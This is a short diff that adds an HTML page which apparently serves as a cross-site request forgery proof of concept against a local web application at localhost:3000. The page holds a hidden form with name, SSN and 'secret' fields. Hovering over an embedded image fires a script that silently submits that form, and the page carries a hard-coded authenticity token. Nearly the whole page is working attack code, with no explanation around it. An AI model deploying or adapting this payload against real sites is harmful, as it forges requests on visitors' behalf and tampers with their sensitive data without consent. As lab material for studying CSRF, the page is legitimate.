@@ -1,0 +1,29 @@
+<html>
+
+<input type="hidden" name="authenticity_token" value="UmuVCPMubzj/AHuybyQPI/O57+4eyeHIKptd5ZYXzCz7pMe67AXU+5KhB5wSFsbX2XtfXtFzo72/KldjIU6lMA==" />
+<head>
+	<script type="text/javascript">
+		function req() {
+			console.log("hello");
+			var x = document.getElementById("f1");
+			console.log("here:" + x);
+			x.submit();
+		}
+	</script>
+</head>
+<form id="f1" action="http://localhost:3000/userdata" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" />
+
+  Name: <input type="hidden" value="pqr" name="info[name]" id="info_name" />
+  SSN: <input type="hidden" value="123456" name="info[ssn]" id="info_ssn" />
+  secret: <input type="hidden" value="fuck me!!!" name="info[secret]" id="info_secret" />
+  comments: <input type="hidden" value="bye bye!" name="info[comments]" id="info_comments" />
+ 
+</form>
+
+
+
+<img src="http://theflame.unishanoi.org/wp-content/uploads/2014/12/Assassin.jpg" width ="200" height="200" onmouseover="req()" />
+
+
+
+</html>
